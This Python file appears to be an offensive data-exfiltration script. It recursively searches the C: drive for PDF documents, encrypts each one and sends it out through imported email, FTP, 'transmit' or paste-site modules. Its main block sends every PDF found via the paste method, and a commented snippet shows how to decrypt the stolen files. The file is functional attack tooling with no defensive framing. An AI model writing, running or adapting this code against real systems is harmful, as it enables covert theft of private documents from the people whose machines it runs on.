from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {
    "outlook": outlook,
    "plain_email": plain_email,
    "plain_ftp": plain_ftp,
    "transmit": transmit,
    "ie_paste": ie_paste,
    "plain_paste": plain_paste
}

def find_docs(doc_type=".pdf"):
    for parent, _, filenames in os.walk("C:\\"):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path

def exfiltrate(document_path, method):
    if method in ["transmit", "plain_ftp"]:
        filename = f"C:\\windows\\temp\\{os.path.basename(document_path)}"
        with open(document_path, "rb") as f:
            contents = f.read()
        with open(filename, "wb") as f:
            f.write(encrypt(contents))

        EXFIL[method](filename)
        os.unlink(filename)
    else:
        with open(document_path, "rb") as f:
            contents = f.read()
        title = os.path.basename(document_path)
        contents = encrypt(contents)
        EXFIL[method](title, contents)

if __name__ == "__main__":
    for fpath in find_docs():
        exfiltrate(fpath, "plain_paste")


# to decrypt:
#from cryptor import decrypt
#with open("encrypted-exfil.txt", "rb") as f:
#    contents = f.read()
#with open("decrypted.pdf", "wb") as f:
#    f.write(decrypt(contents))